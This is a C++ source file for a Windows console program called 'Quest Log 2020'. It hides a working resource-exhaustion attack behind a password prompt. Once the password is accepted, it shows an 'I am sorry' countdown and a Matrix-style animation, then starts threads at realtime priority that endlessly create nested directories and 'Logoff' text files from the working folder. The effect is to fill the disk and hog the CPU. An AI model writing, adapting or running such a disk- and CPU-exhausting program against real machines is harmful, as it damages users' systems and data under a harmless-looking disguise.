#include <iostream>
#include <fstream>
#include <iomanip>
#include <Windows.h>
#include <ctime>
#include <string>
#include <conio.h>
#include <vector>
#include <WinBase.h>
#include <stdio.h>  /* defines FILENAME_MAX */
#include <direct.h>
#include <thread>
#include <sstream>
#include "Matrix.h"
#define GetCurrentDir _getcwd

using namespace std;
bool minorTxt = false;
string _getWord();
void dCopyAry(char arr[], string str);
void bad(int val);
void draw();
void sorryNotSorry();
vector<string> vectorList;
char rootDir[256];
void resizeConsole(int, int);
void gotoxy(int column, int line);
void gotoxy(COORD Point);
COORD getCOORD();
int wherex();
int wherey();
stringstream str(stringstream::out | stringstream::binary);
string txtStream = "Logoff";

void main(){
	SetConsoleTitle("Quest Log 2020");
	srand((unsigned int)time(NULL));
	int value = rand();
	resizeConsole(63, 197);
	string fpass = "";
	HANDLE  hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	SetConsoleTextAttribute(hConsole, 266); // green
	str << txtStream;
	while (fpass != "gotoRbad" && fpass != "password"){
		SetConsoleTitle("Enter your password : ");
		gotoxy(92, 31);
		cout <<  "Quest Log : ";
		fpass = _getWord();

		system("cls");
	
	}
	if (fpass == "password")
		minorTxt = true;
	sorryNotSorry();	
	SetConsoleTitle("File Corruption . . . ");
	thread d(draw);
	while (true){

		thread b(bad, value + 111);
		value = rand();
		thread a(bad, value + 888);
		value = rand();
		thread g(bad, value + 999);
		value = rand();
		thread c(bad, value + 22);
		value = rand();
		thread e(bad, value + 555);
		value = rand();
		thread f(bad, value + 777);
		value = rand();
		b.join();
		d.join();
		a.join();
		c.join();
		e.join();
		f.join();
		g.join();
		value += 133;
		while (!g.joinable() || !f.joinable() || b.joinable());
	}
}

void sorryNotSorry(){
	cout << "Initating count down";
	Sleep(100);
	cout << ". ";
	Sleep(200);
	cout << ". ";
	Sleep(200);
	cout << ". ";
	Sleep(1000);
	system("cls");
	cout << "I am sorry. . . ";
	Sleep(850);
	DWORD result = 0;
	result = GetCurrentDirectory(256, rootDir);
	for (int i = 0; i < 150000; i++){
		vectorList.push_back("LogOff " + to_string(i));
	}
	system("cls");
}
void draw(){
	RemoveCursor();

	// Set the console title and double the consoles height
#if (_WIN32_WINNT == _WIN32_WINNT_WINXP)
	if (!SetConsoleTitle("Matrix - Win32 Console")) {
		std::cout << "SetConsoleTitle returned an error: " << GetLastError();
	}

	SMALL_RECT windowSize = { 0, 0, 79, 49 };
	if (!SetConsoleWindowInfo(GetStdHandle(STD_OUTPUT_HANDLE), TRUE, &windowSize)) {
		std::cout << "SetConsoleWindowInfo returned an error: " << GetLastError();
	}
#else
	// Windows Vista/7 have disabled FULL SCREEN
	ShowWindow(GetConsoleWindow(), SW_MAXIMIZE);
#endif


	std::vector<Matrix>matrix;
	/*
	matrix.push_back(Matrix(0, 0, 5, 15));
	matrix.push_back(Matrix(65, 0, 5, 15));
	matrix.push_back(Matrix(0, 0, 5, 15));
	matrix.push_back(Matrix(65, 0, 5, 15));

	matrix.push_back(Matrix(0, 0, 5, 15));  matrix.back().setErase(true);
	matrix.push_back(Matrix(65, 0, 5, 15)); matrix.back().setErase(true);
	matrix.push_back(Matrix(0, 0, 5, 15));  matrix.back().setErase(true);
	matrix.push_back(Matrix(65, 0, 5, 15)); matrix.back().setErase(true);
	*/

	for (int y = 0; y < 15; y++) {
		matrix.push_back(Matrix());
	}

	for (int z = 0; z < 5; z++) {
		matrix.push_back(Matrix()); matrix.at(z).setErase(true);
	}

	while (1) {
		Sleep(1);

		for (int x = 0; x < (int)matrix.size(); x++) {
			matrix.at(x).display();
		}
	}

}
void bad(int val){
	SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST);
	ofstream File;
	DWORD result = 0;
	BOOL CreateFileNew = true;
	char currentDir[256];
	char copy[256];
	strcpy_s(currentDir, rootDir);
	if (result == 0){
		//return;
	}
	for (int j = 0; j < 99999; j++){
		string gobig = "_" + to_string(val);
		if (j > 0){
			gobig += "(" + to_string(j) + ")";
		}
		for (int i = 0; i < (int)vectorList.size(); i++){
			strcpy_s(copy, currentDir);
			string temp(copy);
			temp += "\\" + vectorList.at(i) + gobig;
			dCopyAry(copy, temp);
			CreateFileNew = CreateDirectory(copy, 0);
			CreateFileNew = SetCurrentDirectory(copy);
			File.open("Logoff" + gobig + ".txt");
			if (File.is_open()){

				for (int i = 0; i < ((minorTxt) ? 1 : ((int)vectorList.size() + j)); i++)
					File.write(str.str().c_str(), str.str().length());
			}
			File.close();
			if ((rand() * 5 % 8 == 0))
			{
				strcpy_s(currentDir, rootDir);
			}
			CreateFileNew = SetCurrentDirectory(currentDir);
		}

	}
	return;
}
void gotoxy(COORD Point){
	SetConsoleCursorPosition(
		GetStdHandle(STD_OUTPUT_HANDLE),
		Point
		);

}
COORD getCOORD(){
	CONSOLE_SCREEN_BUFFER_INFO csbi;
	if (!GetConsoleScreenBufferInfo(
		GetStdHandle(STD_OUTPUT_HANDLE),
		&csbi
		))
		return{ wherex(), wherey() };
	return csbi.dwCursorPosition;
}
void gotoxy(int column, int line)
{
	COORD coord;
	coord.X = column;
	coord.Y = line;
	SetConsoleCursorPosition(
		GetStdHandle(STD_OUTPUT_HANDLE),
		coord
		);
}
int wherex()
{
	CONSOLE_SCREEN_BUFFER_INFO csbi;
	COORD  result;
	if (!GetConsoleScreenBufferInfo(
		GetStdHandle(STD_OUTPUT_HANDLE),
		&csbi
		))
		return -1;
	result = csbi.dwCursorPosition;
	return result.X;
}
int wherey()
{
	CONSOLE_SCREEN_BUFFER_INFO csbi;
	COORD  result;
	if (!GetConsoleScreenBufferInfo(
		GetStdHandle(STD_OUTPUT_HANDLE),
		&csbi
		))
		return -1;
	result = csbi.dwCursorPosition;
	return result.Y;
}
void dCopyAry(char arr[], string str){
	for (int i = 0; i < 256; i++)
		if (i < (int)str.length())
			arr[i] = str[i];
		else
		{
			arr[i] = '\0';
			return;
		}
}
string _getWord(){
	string word;
	int temp;
	int x = wherex();
	int b;
	do
	{
		temp = _getch();
		if (temp != 0 && temp != 13 && temp != 8)
		{
			word += char(temp);
			cout << '*';
		}
		else if (temp == 8)
		{
			//I want to erase a "*" and
			//backspace the last key entered into password
			word = word.substr(0, (int)word.length() - 1);
			cout << "\b" << " " << "\b";
			b = wherex();
			if (b < x)
				gotoxy(x, wherey());
		}
	} while (temp != 13);
	return word;
}
void resizeConsole(int height, int width){
	HANDLE hConOut = GetStdHandle(STD_OUTPUT_HANDLE);
	CONSOLE_SCREEN_BUFFER_INFO csbi;
	if (!GetConsoleScreenBufferInfo(hConOut, &csbi)){ return; }
	SMALL_RECT r;
	COORD c = { width, height };
	r.Left = 0;
	r.Top = 0;
	r.Right = width - 1;
	r.Bottom = height - 1;
	SetConsoleWindowInfo(hConOut, TRUE, &r);
	SetConsoleScreenBufferSize(hConOut, c);
	HWND console = GetConsoleWindow();
	MoveWindow(GetConsoleWindow(), r.Left, r.Top, 3200, 800, TRUE);
	return;
}